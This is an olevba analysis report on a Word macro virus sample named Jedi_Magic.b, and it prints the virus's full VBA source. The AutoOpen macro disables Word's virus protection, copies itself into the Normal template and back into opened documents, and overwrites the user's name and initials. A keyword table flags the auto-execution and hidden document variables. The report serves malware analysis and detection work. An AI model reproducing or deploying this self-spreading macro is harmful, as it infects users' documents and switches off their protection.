olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jedi_Magic.b-4bdbe3e2ecfc701b482f530a18e07ad2a3c831f6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jedi_Magic.b-4bdbe3e2ecfc701b482f530a18e07ad2a3c831f6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO valmir.bas 
in file: Virus.MSWord.Jedi_Magic.b-4bdbe3e2ecfc701b482f530a18e07ad2a3c831f6 - OLE stream: 'Macros/VBA/valmir'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 03/12/98 by Membership & Registry Division"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.Jedi_Magic.AutoOpen"
Options.VirusProtection = False
If Application.UserInitials <> "VAL" Then
    Application.OrganizerCopy Source:= _
    ActiveDocument.FullName, Destination:= _
    NormalTemplate.FullName, Name:="valmir", _
    Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Save
    Application.UserName = "valmir"
    Application.UserInitials = "VAL"
    Application.UserAddress = "jvalmir@zaz.com.br"
End If
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Force" Then num = aVar.Index
Next aVar
If num = 0 Then
    
    
    
    
    
    
    
    
    Application.OrganizerCopy Source:= _
    NormalTemplate.FullName, Destination:= _
    ActiveDocument.FullName, Name:="Valmir", _
    Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Variables.Add Name:="Force", Value:="567374-Valmir"
    ActiveDocument.Save
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
+----------+--------------------+---------------------------------------------+
